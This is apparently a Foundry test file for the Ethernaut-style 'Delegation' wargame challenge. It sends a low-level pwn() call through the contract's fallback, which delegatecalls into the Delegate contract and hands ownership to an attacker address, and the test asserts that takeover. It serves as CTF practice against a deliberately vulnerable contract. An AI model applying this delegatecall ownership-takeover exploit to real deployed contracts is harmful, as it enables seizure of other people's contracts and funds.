// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../../src/challenge-06_Delegation/Delegation.sol";

contract TestDelegation is Test {
    Delegate public delegateContract;
    Delegation public delegationContract;

    address public ORIGINAL_OWNER = makeAddr("original_owner");
    address public ATTACKER = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(ORIGINAL_OWNER);
        delegateContract = new Delegate(ORIGINAL_OWNER);
        delegationContract = new Delegation(address(delegateContract));
        vm.stopPrank();

        // Initial sanity checks
        assertEq(delegationContract.owner(), ORIGINAL_OWNER);
        assertEq(delegateContract.owner(), ORIGINAL_OWNER);
    }

    function testDelegationAttack() public {
        console.log("Delegation Owner Before Attack:", delegationContract.owner());

        vm.startPrank(ATTACKER);

        // Low-level call to Delegation fallback with selector for pwn()
        bytes memory data = abi.encodeWithSignature("pwn()");
        (bool success, ) = address(delegationContract).call(data);

        require(success, "Exploit call failed");

        vm.stopPrank();

        console.log("Delegation Owner After Attack:", delegationContract.owner());

        // Assert attacker has claimed ownership of Delegation
        assertEq(delegationContract.owner(), ATTACKER);
    }
}